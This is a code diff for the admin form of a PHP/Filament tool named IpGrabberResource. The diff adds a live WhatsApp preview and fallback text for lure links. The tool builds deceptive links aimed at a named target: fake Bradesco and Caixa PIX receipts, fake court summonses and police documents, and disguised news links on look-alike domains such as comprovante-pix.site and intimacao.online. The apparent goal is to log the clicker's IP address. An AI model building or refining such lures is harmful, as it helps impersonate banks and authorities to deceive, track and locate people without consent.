@@ -100,9 +100,18 @@ class IpGrabberResource extends Resource
 
     public static function form(Schema $schema): Schema
     {
-        return $schema->components([
+        return $schema
+            ->columns([
+                'default' => 1,
+                'xl' => 3,
+            ])
+            ->components([
             \Filament\Schemas\Components\Section::make('Identificação')
                 ->description('Descreva o alvo ou contexto de uso deste IP Grabber.')
+                ->columnSpan([
+                    'default' => 1,
+                    'xl' => 2,
+                ])
                 ->components([
                     Forms\Components\TextInput::make('label')
                         ->label('Rótulo / Identificação')
@@ -137,6 +146,7 @@ class IpGrabberResource extends Resource
                         ])
                         ->default('comprovante-pix.site')
                         ->selectablePlaceholder(false)
+                        ->live()
                         ->required(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                         ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                         ->helperText('Escolha qual domínio será usado no link gerado para a mensagem do sistema.')
@@ -161,6 +171,7 @@ class IpGrabberResource extends Resource
                         ->label('Informe o valor')
                         ->placeholder('Ex: 380,00')
                         ->maxLength(20)
+                        ->live(debounce: 400)
                         ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_caixa')
                         ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_caixa')
                         ->helperText('Valor que aparecerá no comprovante.')
@@ -174,6 +185,7 @@ class IpGrabberResource extends Resource
                         ->visibility('public')
                         ->acceptedFileTypes(['application/pdf', 'image/jpeg', 'image/png'])
                         ->maxSize(10240)
+                        ->live()
                         ->required(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
                         ->visible(fn (Get $get): bool => $get('preview_tipo') === 'intimacao')
                         ->columnSpanFull(),
@@ -193,6 +205,7 @@ class IpGrabberResource extends Resource
                         ->placeholder('https://site.com/noticia...')
                         ->url()
                         ->maxLength(255)
+                        ->live(debounce: 400)
                         ->required(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                         ->visible(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                         ->helperText('O sistema usará título, descrição e imagem da notícia no preview. Ao clicar, o alvo será encaminhado para esta URL.')
@@ -202,6 +215,7 @@ class IpGrabberResource extends Resource
                         ->label('Nome do alvo')
                         ->placeholder('Ex: João da Silva')
                         ->maxLength(60)
+                        ->live(debounce: 400)
                         ->required(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
                         ->visible(fn (Get $get): bool => $get('preview_tipo') === 'pix_nome_alvo')
                         ->helperText('Nome que será escrito automaticamente no comprovante PIX com a data e hora atuais.')
@@ -226,21 +240,39 @@ class IpGrabberResource extends Resource
                         ->columnSpanFull(),
                 ]),
 
+            \Filament\Schemas\Components\Section::make('Preview no Whatsapp')
+                ->description('Simula visualmente como o link tende a aparecer no WhatsApp Web.')
+                ->columnStart([
+                    'xl' => 3,
+                ])
+                ->components([
+                    Forms\Components\Placeholder::make('whatsapp_preview_top')
+                        ->hiddenLabel()
+                        ->content(fn (Get $get): HtmlString => static::renderWhatsappPreview($get))
+                        ->columnSpanFull(),
+                ]),
+
             \Filament\Schemas\Components\Section::make('Mensagem Customizada')
                 ->description('O que aparece quando o link é colado antes de ser clicado.')
                 ->collapsed()
+                ->columnSpan([
+                    'default' => 1,
+                    'xl' => 2,
+                ])
                 ->visible(fn (Get $get): bool => $get('preview_tipo') === 'mensagem')
                 ->components([
                     Forms\Components\TextInput::make('og_titulo')
                         ->label('Título do preview')
                         ->placeholder('Ex: Documento Policial - Delegacia de Confresa')
                         ->maxLength(255)
+                        ->live(debounce: 400)
                         ->columnSpanFull(),
 
                     Forms\Components\TextInput::make('og_descricao')
                         ->label('Descrição do preview')
                         ->placeholder('Ex: Clique para visualizar o documento.')
                         ->maxLength(255)
+                        ->live(debounce: 400)
                         ->columnSpanFull(),
 
                     Forms\Components\Toggle::make('preview_usar_upload')
@@ -281,6 +313,7 @@ class IpGrabberResource extends Resource
                         ->imagePreviewHeight('120')
                         ->maxSize(4096)
                         ->acceptedFileTypes(['image/jpeg', 'image/png'])
+                        ->live()
                         ->required(fn (Get $get): bool => (bool) $get('preview_usar_upload'))
                         ->visible(fn (Get $get): bool => (bool) $get('preview_usar_upload'))
                         ->columnSpanFull(),
@@ -289,6 +322,7 @@ class IpGrabberResource extends Resource
                         ->label('URL da imagem do preview')
                         ->placeholder('https://seudominio.com/imagens/preview.jpg')
                         ->url()
+                        ->live(debounce: 400)
                         ->required(fn (Get $get): bool => (bool) $get('preview_usar_url'))
                         ->visible(fn (Get $get): bool => (bool) $get('preview_usar_url'))
                         ->helperText('Tamanho ideal: 1200x630px.')
@@ -298,6 +332,13 @@ class IpGrabberResource extends Resource
 
             \Filament\Schemas\Components\Section::make('Preview no Whatsapp')
                 ->description('Simula visualmente como o link tende a aparecer no WhatsApp Web.')
+                ->columnStart([
+                    'xl' => 3,
+                ])
+                ->columnOrder([
+                    'xl' => 1,
+                ])
+                ->hidden()
                 ->components([
                     Forms\Components\Placeholder::make('whatsapp_preview')
                         ->hiddenLabel()
@@ -309,47 +350,201 @@ class IpGrabberResource extends Resource
 
     private static function renderWhatsappPreview(Get $get): HtmlString
     {
-        $title = trim((string) ($get('og_titulo') ?: 'Título do preview'));
-        $description = trim((string) ($get('og_descricao') ?: 'A descrição do link aparecerá aqui no momento do compartilhamento.'));
-        $message = trim((string) ($get('mensagem') ?: IpGrabber::DEFAULT_CLICK_MESSAGE));
-        $domain = trim((string) ($get('tracking_domain') ?: 'comprovante-pix.site'));
-        $imageUrl = static::resolveWhatsappPreviewImageUrl($get);
+        $preview = static::resolveWhatsappPreviewData($get);
+        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
+        $imageStyle = match ($previewType) {
+            'pix_bradesco' => 'display:block;width:100%;height:152px;object-fit:contain;object-position:center;background:#ffffff;padding:4px 0;',
+            'pix_caixa', 'pix_nome_alvo' => 'display:block;width:100%;height:152px;object-fit:contain;object-position:center;background:#ffffff;padding:8px 6px;',
+            default => 'display:block;width:100%;height:152px;object-fit:cover;',
+        };
 
-        $imageBlock = $imageUrl
-            ? '<img src="' . e($imageUrl) . '" alt="Preview do link" style="display:block;width:100%;height:180px;object-fit:cover;">'
-            : '<div style="display:flex;align-items:center;justify-content:center;width:100%;height:180px;background:linear-gradient(135deg,#d1fae5 0%,#dcfce7 45%,#f0fdf4 100%);color:#166534;font-size:0.9rem;font-weight:600;">Imagem do preview</div>';
+        $imageBlock = $preview['imageUrl']
+            ? '<img src="' . e($preview['imageUrl']) . '" alt="Preview do link" style="' . $imageStyle . '">'
+            : '<div style="display:flex;align-items:center;justify-content:center;width:100%;height:152px;background:linear-gradient(135deg,#d1fae5 0%,#dcfce7 45%,#f0fdf4 100%);color:#166534;font-size:0.84rem;font-weight:600;">Imagem do preview</div>';
 
         return new HtmlString(
-            '<div style="max-width:540px;border-radius:18px;background:#efeae2;padding:18px 16px;font-family:Segoe UI,Helvetica,Arial,sans-serif;">'
+            '<div style="max-width:480px;border-radius:16px;background:#efeae2;padding:14px 12px;font-family:Segoe UI,Helvetica,Arial,sans-serif;">'
                 . '<div style="display:flex;justify-content:flex-end;">'
-                    . '<div style="max-width:420px;min-width:320px;border-radius:10px 10px 4px 10px;background:#d9fdd3;padding:10px 10px 8px;box-shadow:0 1px 1px rgba(0,0,0,.08);">'
-                        . '<div style="margin-bottom:8px;color:#111b21;font-size:14px;line-height:1.45;">' . e($message) . '</div>'
+                    . '<div style="max-width:372px;min-width:280px;border-radius:10px 10px 4px 10px;background:#d9fdd3;padding:9px 9px 7px;box-shadow:0 1px 1px rgba(0,0,0,.08);">'
+                        . '<div style="margin-bottom:7px;color:#111b21;font-size:13px;line-height:1.4;">' . e($preview['message']) . '</div>'
                         . '<div style="overflow:hidden;border-radius:8px;background:#fff;border:1px solid #d1d7db;">'
                             . $imageBlock
-                            . '<div style="padding:10px 12px 12px;">'
-                                . '<div style="margin-bottom:4px;color:#667781;font-size:11px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;">' . e($domain) . '</div>'
-                                . '<div style="margin-bottom:4px;color:#111b21;font-size:15px;font-weight:600;line-height:1.35;">' . e($title) . '</div>'
-                                . '<div style="color:#667781;font-size:13px;line-height:1.4;">' . e($description) . '</div>'
+                            . '<div style="padding:9px 11px 10px;">'
+                                . '<div style="margin-bottom:3px;color:#667781;font-size:10px;font-weight:700;letter-spacing:.04em;text-transform:uppercase;">' . e($preview['domain']) . '</div>'
+                                . '<div style="margin-bottom:4px;color:#111b21;font-size:14px;font-weight:600;line-height:1.3;">' . e($preview['title']) . '</div>'
+                                . '<div style="color:#667781;font-size:12px;line-height:1.35;">' . e($preview['description']) . '</div>'
                             . '</div>'
                         . '</div>'
-                        . '<div style="margin-top:6px;text-align:right;color:#667781;font-size:11px;">agora</div>'
+                        . '<div style="margin-top:5px;text-align:right;color:#667781;font-size:10px;">agora</div>'
                     . '</div>'
                 . '</div>'
             . '</div>'
         );
     }
 
-    private static function resolveWhatsappPreviewImageUrl(Get $get): ?string
+    /**
+     * @return array{title:string,description:string,message:string,domain:string,imageUrl:?string}
+     */
+    private static function resolveWhatsappPreviewData(Get $get): array
     {
+        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
+        $title = trim((string) ($get('og_titulo') ?: ''));
+        $description = trim((string) ($get('og_descricao') ?: ''));
+        $message = trim((string) ($get('mensagem') ?: ''));
+        $domain = static::resolvePreviewDomain($get);
+        $newsMetadata = static::resolveNewsPreviewMetadata($get);
+
+        [$fallbackTitle, $fallbackDescription, $fallbackMessage, $fallbackDomain] = match ($previewType) {
+            'noticia' => [
+                'Prévia da notícia',
+                trim((string) ($get('noticia_url') ?: 'Clique para abrir a notícia compartilhada.')),
+                'Abrindo notícia, aguarde...',
+                'agenciadanoticia.online',
+            ],
+            'pix_bradesco' => [
+                'Comprovante PIX Bradesco',
+                'Confirme sua chave pix clicando aqui.',
+                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
+                'comprovante-pix.site',
+            ],
+            'pix_caixa' => [
+                'Comprovante PIX Caixa',
+                'Clique para abrir seu comprovante.',
+                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
+                'comprovante.online',
+            ],
+            'pix_nome_alvo' => [
+                'Comprovante PIX',
+                'Abra o comprovante para confirmar sua chave pix',
+                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
+                'comprovante.online',
+            ],
+            'intimacao' => [
+                'Intimação.pdf',
+                'Clique para visualizar e baixar o documento oficial.',
+                'Aceite e aguarde o download da intimação',
+                'intimacao.online',
+            ],
+            default => [
+                'Título do preview',
+                'A descrição do link aparecerá aqui no momento do compartilhamento.',
+                (string) IpGrabber::DEFAULT_CLICK_MESSAGE,
+                'comprovante-pix.site',
+            ],
+        };
+
+        if ($previewType === 'noticia') {
+            $fallbackTitle = (string) ($newsMetadata['og_titulo'] ?? $fallbackTitle);
+            $fallbackDescription = (string) ($newsMetadata['og_descricao'] ?? $fallbackDescription);
+        }
+
+        return [
+            'title' => $title !== '' ? $title : $fallbackTitle,
+            'description' => $description !== '' ? $description : $fallbackDescription,
+            'message' => $message !== '' ? $message : $fallbackMessage,
+            'domain' => $domain !== '' ? $domain : $fallbackDomain,
+            'imageUrl' => static::resolveWhatsappPreviewImageUrl($get, $newsMetadata),
+        ];
+    }
+
+    private static function resolveWhatsappPreviewImageUrl(Get $get, array $newsMetadata = []): ?string
+    {
+        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
         $uploadPath = trim((string) ($get('og_imagem_upload') ?: ''));
 
         if ($uploadPath !== '') {
-            return Storage::disk('public')->url($uploadPath);
+            return static::resolveStoragePreviewAssetUrl($uploadPath);
         }
 
         $imageUrl = trim((string) ($get('og_imagem') ?: ''));
 
-        return $imageUrl !== '' ? $imageUrl : null;
+        if ($imageUrl !== '') {
+            return $imageUrl;
+        }
+
+        if ($previewType === 'noticia' && filled($newsMetadata['og_imagem'] ?? null)) {
+            return (string) $newsMetadata['og_imagem'];
+        }
+
+        if ($previewType === 'intimacao') {
+            $intimacaoArquivo = trim((string) ($get('intimacao_arquivo') ?: ''));
+
+            if ($intimacaoArquivo !== '' && preg_match('/\.(png|jpe?g|webp)$/i', $intimacaoArquivo)) {
+                return static::resolveStoragePreviewAssetUrl($intimacaoArquivo);
+            }
+        }
+
+        return match ($previewType) {
+            'pix_bradesco' => static::resolveStoragePreviewAssetUrl('pixel-og/templates/pix-bradesco.png'),
+            'pix_caixa' => static::resolvePublicPreviewAssetUrl('images/comprovante-pix-caixa.png'),
+            'pix_nome_alvo' => static::resolvePublicPreviewAssetUrl('images/pix-img-gerar.png'),
+            default => null,
+        };
+    }
+
+    private static function resolvePreviewDomain(Get $get): string
+    {
+        $previewType = (string) ($get('preview_tipo') ?: 'mensagem');
+        $trackingDomain = trim((string) ($get('tracking_domain') ?: ''));
+
+        return match ($previewType) {
+            'pix_bradesco' => 'comprovante-pix.site',
+            'pix_caixa', 'pix_nome_alvo' => 'comprovante.online',
+            'intimacao' => 'intimacao.online',
+            'noticia' => 'agenciadanoticia.online',
+            default => $trackingDomain,
+        };
+    }
+
+    private static function resolveNewsPreviewMetadata(Get $get): array
+    {
+        if ((string) ($get('preview_tipo') ?: '') !== 'noticia') {
+            return [];
+        }
+
+        $newsUrl = trim((string) ($get('noticia_url') ?: ''));
+
+        if ($newsUrl === '') {
+            return [];
+        }
+
+        try {
+            return app(\App\Services\Pixel\NewsPreviewMetadataService::class)->fetch($newsUrl);
+        } catch (\Throwable) {
+            return [];
+        }
+    }
+
+    private static function resolveStoragePreviewAssetUrl(string $relativePath): ?string
+    {
+        $normalizedPath = ltrim(str_replace('\\', '/', $relativePath), '/');
+
+        if (Storage::disk('public')->exists($normalizedPath)) {
+            $publicStoragePath = public_path('storage/' . $normalizedPath);
+
+            if (file_exists($publicStoragePath)) {
+                return url('/storage/' . $normalizedPath);
+            }
+
+            $contents = Storage::disk('public')->get($normalizedPath);
+            $mimeType = Storage::disk('public')->mimeType($normalizedPath) ?: 'image/png';
+
+            return 'data:' . $mimeType . ';base64,' . base64_encode($contents);
+        }
+
+        return null;
+    }
+
+    private static function resolvePublicPreviewAssetUrl(string $relativePath): ?string
+    {
+        $normalizedPath = ltrim(str_replace('\\', '/', $relativePath), '/');
+        $fullPath = public_path($normalizedPath);
+
+        if (! file_exists($fullPath)) {
+            return null;
+        }
+
+        return url('/' . $normalizedPath);
     }
 
     public static function table(Table $table): Table
